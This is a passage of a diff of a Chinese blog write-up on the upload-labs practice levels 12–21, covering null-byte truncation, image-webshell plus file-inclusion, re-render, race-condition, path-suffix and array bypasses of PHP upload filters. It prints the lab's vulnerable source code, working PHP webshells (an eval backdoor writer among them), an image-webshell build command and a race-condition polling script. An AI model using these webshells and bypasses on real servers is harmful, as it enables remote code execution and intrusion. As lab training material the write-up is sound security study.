+它解释为一个空字节（也就是ascii值为0）在php5.3之前，php会将这个空字节转化为\000，而php5.3之前文件名如果出现\000，会导致文件名被截断，只保留%00之前的内容。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>上传的一句话木马的内容</p>
-<p>&lt;!–code￼21–&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php $GET[0]($_GET[1]);?&gt;
+通过get参数0接受要执行的函数名
+通过get参数1接受该函数的参数
+从而动态执行任意的php函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081559666.png" alt="image-20250508155908605"></p>
 <p>在请求头加上文件名%00进行截断，然后发包</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081601354.png" alt="image-20250508160101315"></p>
 <p>可以通过一句话木马执行任意的函数</p>
-<p>&lt;!–code￼22–&gt;
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost&#x2F;upload-labs-master&#x2F;upload&#x2F;yc.php?0&#x3D;phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081639602.png" alt="image-20250508163925546"></p>
 <h1 id="upload-13-post传参的-00截断"><a href="#upload-13-post传参的-00截断" class="headerlink" title="upload-13(post传参的%00截断)"></a>upload-13(post传参的%00截断)</h1><p>关键如下：</p>
-<p>&lt;!–code￼23–&gt;
+<pre class="line-numbers language-none"><code class="language-none">if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
+    if(in_array($file_ext,$ext_arr))&#123;
+        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+        $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>这一关使用的是POST传参，由于POST传参不会对%00进行编码，所以我们需要在文件名的后面加上一个占位符，再将占位符的十六 进制数更改为00，这样空字节就出来了，再移动字节的时候就会出现%00截断。</p>
 <p>上传php文件抓包</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081643611.png" alt="image-20250508164355554"></p>
@@ -340,38 +409,97 @@
 <p><strong>截断的原理</strong></p>
 <p>低版本的<code>php</code>遇到00(空字节)会认为字符串结束，实际保存的路径姐变成了<code>/upload/yc.php</code>，后面的a被忽略了。</p>
 <h1 id="upload-14-图片马-文件包含"><a href="#upload-14-图片马-文件包含" class="headerlink" title="upload-14(图片马+文件包含)"></a>upload-14(图片马+文件包含)</h1><p>源码：</p>
-<p>&lt;!–code￼24–&gt;
+<pre class="line-numbers language-none"><code class="language-none">function getReailFileType($filename)&#123;
+    $file &#x3D; fopen($filename, &quot;rb&quot;);
+    $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节
+    fclose($file);
+    $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin);
+    $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);
+    $fileType &#x3D; &#39;&#39;;
+    switch($typeCode)&#123;
+        case 255216:
+            $fileType &#x3D; &#39;jpg&#39;;
+            break;
+        case 13780:
+            $fileType &#x3D; &#39;png&#39;;
+            break;
+        case 7173:
+            $fileType &#x3D; &#39;gif&#39;;
+            break;
+        default:
+            $fileType &#x3D; &#39;unknown&#39;;
+        &#125;
+        return $fileType;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>有源码可知这一关通过直接读取文件头标识来检测文件的真实类型，所以常规的绕过方法不可用。</p>
 <p>这里使用图片马+文件包含绕过</p>
-<p>&lt;!–code￼25–&gt;
+<pre class="line-numbers language-none"><code class="language-none">图片马的制作：
+在对应的文件夹下面打开cmd命令，执行下面的命令
+copy login.jpg&#x2F;b+cj.php&#x2F;a cj.jpg(login.jpg是任意的图片，cj.php是一句话木马，test.jpg是
+生成的一句话木马)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>上传生成的图片马</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081659600.png" alt="image-20250508165915516"></p>
 <p>点击上面的文件包含，得到</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081659848.png" alt="image-20250508165956809"></p>
 <p>所以这里使用了file作为参数进行文件包含</p>
-<p>&lt;!–code￼26–&gt;
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;10.18.208.98&#x2F;upload-labs-master&#x2F;include.php?
+ file&#x3D;upload&#x2F;6720250321175356.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081704060.png" alt="image-20250508170441017"></p>
-<h1 id="upload-15-图片马-文件包含"><a href="#upload-15-图片马-文件包含" class="headerlink" title="upload-15(图片马+文件包含)"></a>upload-15(图片马+文件包含)</h1><p>&lt;!–code￼27–&gt;
+<h1 id="upload-15-图片马-文件包含"><a href="#upload-15-图片马-文件包含" class="headerlink" title="upload-15(图片马+文件包含)"></a>upload-15(图片马+文件包含)</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-</p>
 <p>这个函数是 <code>PHP</code> 中用于检测图像文件信息的核心函数</p>
 <p>与14相同的操作</p>
 <h1 id="upload-16-图片马-文件包含"><a href="#upload-16-图片马-文件包含" class="headerlink" title="upload-16(图片马+文件包含)"></a>upload-16(图片马+文件包含)</h1><p>关键源码</p>
-<p>&lt;!–code￼28–&gt;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token comment">//需要开启php_exif模块</span>
+    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_GIF</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_JPEG</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">default</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p><code>exif_imagetype()</code>函数读取文件头部的魔数(magic number)判断图像类型</p>
 <p>与14，15基本相同，只需要在小皮上面打开一个扩展<code>php_exif</code> <code>exif_imagetype()</code>是<code>php_exi</code>f扩展的一部分，不打开扩展的话本关会报错。</p>
 <h1 id="upload-17-二次渲染绕过"><a href="#upload-17-二次渲染绕过" class="headerlink" title="upload-17(二次渲染绕过)"></a>upload-17(二次渲染绕过)</h1><p>关键源码</p>
-<p>&lt;!–code￼29–&gt;
+<pre class="line-numbers language-none"><code class="language-none">$fileext&#x3D; substr(strrchr($filename,&quot;.&quot;),1);
 
-</p>
+    &#x2F;&#x2F;判断文件后缀与类型，合法才进行上传操作
+    if(($fileext &#x3D;&#x3D; &quot;jpg&quot;) &amp;&amp; ($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;))&#123;
+        if(move_uploaded_file($tmpname,$target_path))&#123;
+            &#x2F;&#x2F;使用上传的图片生成新的图片
+            $im &#x3D; imagecreatefromjpeg($target_path);
+
+            if($im &#x3D;&#x3D; false)&#123;
+                $msg &#x3D; &quot;该文件不是jpg格式的图片！&quot;;
+                @unlink($target_path);
+            &#125;else&#123;
+                &#x2F;&#x2F;给新图片指定文件名
+                srand(time());
+                $newfilename &#x3D; strval(rand()).&quot;.jpg&quot;;
+                &#x2F;&#x2F;显示二次渲染后的图片（使用用户上传图片生成的新图片）
+                $img_path &#x3D; UPLOAD_PATH.&#39;&#x2F;&#39;.$newfilename;
+                imagejpeg($im,$img_path);
+                @unlink($target_path);
+                $is_upload &#x3D; true;
+            &#125;
+        &#125; else &#123;
+            $msg &#x3D; &quot;上传出错！&quot;;
+        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>检查扩展名，MIME类型验证G</p>
 <p><strong><code>imagecreatefromjpeg()</code>尝试将上传的文件作为<code>JPEG</code>图像解析，GD库会自动丢弃所有的非图像数据（包括隐藏在文件末尾的<code>php</code>代码）</strong>，这样就达到了二次渲染的效果。</p>
 <p>经过函数处理之前的<code>wangcai.jpg</code>在010中效果</p>
@@ -379,9 +507,9 @@
 <p>经函数处理之后的<code>wangcai.jpg</code>文件在010中的效果</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091354327.png" alt="image-20250509135448273"></p>
 <p>对比两次的图，相同的数据为</p>
-<p>&lt;!–code￼30–&gt;
+<pre class="line-numbers language-none"><code class="language-none">B4 B5 B6 B7 B8 B9 C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4 D5 D6 D7 D8 D9 DA E1 E2 E3 E4
+这段数据对应的字符的长度刚好为一句话木马对应的字符的长度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-</p>
 <p>将不变的部分替换为一句话木马：</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091405571.png" alt="image-20250509140528530"></p>
 <p>将替换之后的wangcai.jpg文件上传</p>
@@ -397,23 +525,53 @@
 <p>木马的代码位于不被渲染处理的数据区域；</p>
 <p>文件扩展名和MIME类型检查都能够通过。</p>
 <h1 id="upload-18-条件竞争漏洞"><a href="#upload-18-条件竞争漏洞" class="headerlink" title="upload-18(条件竞争漏洞)"></a>upload-18(条件竞争漏洞)</h1><p>源码：</p>
-<p>&lt;!–code￼31–&gt;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
 
-</p>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
+             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
+            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
 <p>首先使用<code>move_uploaded_file</code>将文件进行上传，然后进行后缀名判断，如果不满足<code>.jpg|.png|.gif</code>文件类型，直接删除。</p>
 <p><strong>漏洞利用原理</strong></p>
 <p>我们可以直接将文件上传到上传到指定的文件路径(服务区)，服务区经过if语句判断是否该删除文件，在服务区没有删除文件的时候，进行访问上传的<code>php</code>文件，上传的php文件访问执行之后会生成一个一句话木马文件。</p>
 <p>下面是上传的一句话木马内容</p>
-<p>&lt;!–code￼32–&gt;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[cmd]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
+    /在目标服务器上面创建后门文件，以写入模式打开或者是创建一个名为shell.php的文件，并向该文件中写入内容，写入的内容为
+    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-</p>
 <p>下面是一个访问creat.php,并且判断shell.php是否已经生成的python脚本</p>
-<p>&lt;!–code￼33–&gt;
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"http://10.18.208.48/upload-labs-master/upload/create.php"</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> html<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+	    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"DOWN"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
-</p>
 <p>上传文件<code>create.php</code>,抓包</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505091954623.png" alt="image-20250509195403558"></p>
 <p>设置payload如下：</p>
@@ -428,9 +586,31 @@
 <p>通过空payload攻击，快速重复发送相同的请求，从而触发服务端的竞争姿态，从而执行上传的后门文件的php代码。</p>
 <h1 id="upload-19-条件竞争漏洞"><a href="#upload-19-条件竞争漏洞" class="headerlink" title="upload-19(条件竞争漏洞)"></a>upload-19(条件竞争漏洞)</h1><p>与18关相同</p>
 <h1 id="upload-20-move-uploaded-file-函数"><a href="#upload-20-move-uploaded-file-函数" class="headerlink" title="upload-20(move_uploaded_file()函数)"></a>upload-20(move_uploaded_file()函数)</h1><p>关键源码如下：</p>
-<p>&lt;!–code￼34–&gt;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-</p>
+        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'禁止保存为该类型文件！'</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>move_uploaded_file()函数有一个特性，将用户上传的临时文件移动到目标路径的时候如果目标路径的末尾包含斜杠<code>/</code>，php会自动的忽略他。</strong></p>
 <p>上传php一句话木马拦截</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505101511083.png" alt="image-20250510151154041"></p>
@@ -438,30 +618,75 @@
 <p><strong>可以这样绕过的原理：</strong></p>
 <p>后端校验获取扩展名的时候得到的是<code>.php/.</code>,不会被拦截，但是再利用<code>move_uploaded_file()</code>函数对路径处理的特性，自动忽略&#x2F;.文件就会保存为<code>.php</code>,，从而能够执行文件内容。</p>
 <h1 id="upload-21-数组绕过"><a href="#upload-21-数组绕过" class="headerlink" title="upload-21(数组绕过)"></a>upload-21(数组绕过)</h1><p>关键源码如下：</p>
-<p>&lt;!–code￼35–&gt;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token comment">//检查MIME</span>
+    <span class="token variable">$allow_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$allow_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"禁止上传该类型文件!"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token comment">//检查文件名</span>
+        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
